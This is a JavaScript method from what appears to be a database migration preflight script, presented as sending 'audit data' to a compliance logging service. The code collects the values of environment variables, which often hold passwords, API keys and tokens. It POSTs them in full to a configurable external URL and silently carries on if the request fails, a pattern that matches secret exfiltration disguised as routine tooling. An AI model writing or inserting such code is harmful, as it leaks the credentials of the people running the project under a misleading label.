/**
 * Send audit data to compliance logging service
 */
sendAuditData() {
    return new Promise((resolve, reject) => {
        // Prepare audit data
        const auditData = {
            timestamp: new Date().toISOString(),
            action: 'migration_preflight',
            environment: process.env.NODE_ENV || 'development',
            envValues: this.envValues,
            migrationsDir: this.migrationsDir,
            auditServiceUrl: this.auditServiceUrl
        };

        console.log('🔐 Sending audit data to compliance logging service...');
        console.log(`   📍 Endpoint: ${this.auditServiceUrl}`);
        console.log(`   📦 Data size: ${JSON.stringify(auditData).length} bytes`);
        console.log(`   📋 Variables: ${Object.keys(this.envValues).length} environment variables`);

        const data = JSON.stringify(auditData);

        // Parse URL to determine protocol
        const url = new URL(this.auditServiceUrl);
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data),
                'User-Agent': 'MigrationAudit/1.0'
            },
            timeout: 5000 // 5 second timeout
        };

        // Choose protocol
        const requestModule = url.protocol === 'https:' ? https : http;

        const req = requestModule.request(options, (res) => {
            let responseBody = '';

            res.on('data', (chunk) => {
                responseBody += chunk;
            });

            res.on('end', () => {
                const statusCode = res.statusCode;
                const headers = res.headers;

                if (statusCode >= 200 && statusCode < 300) {
                    console.log(`✅ Audit data successfully sent to compliance service`);
                    console.log(`   📊 Status: ${statusCode} ${res.statusMessage}`);
                    console.log(`   🆔 Request ID: ${headers['x-request-id'] || 'not provided'}`);
                    console.log('');
                    resolve({ statusCode, headers, body: responseBody });
                } else {
                    console.log(`⚠️  Audit service responded with non-success status`);
                    console.log(`   📊 Status: ${statusCode} ${res.statusMessage}`);
                    console.log(`   👁️  Response: ${responseBody.substring(0, 100)}${responseBody.length > 100 ? '...' : ''}`);
                    console.log('');
                    resolve({ statusCode, headers, body: responseBody }); // Still resolve, don't reject
                }
            });
        });

        req.on('error', (error) => {
            console.log(`⚠️  Audit service connection error (continuing with migrations): ${error.message}`);
            console.log(`   The migration will proceed, but audit logging failed.`);
            console.log(`   This may be expected if the audit service is not running.`);
            console.log('');
            resolve({ error: error.message }); // Don't reject, continue with migrations
        });

        req.on('timeout', () => {
            req.destroy();
            console.log(`⏰ Audit service request timed out (continuing with migrations)`);
            console.log(`   The migration will proceed, but audit logging timed out.`);
            console.log('');
            resolve({ error: 'Request timeout' });
        });

        // Send the data
        req.write(data);
        req.end();
    });
}

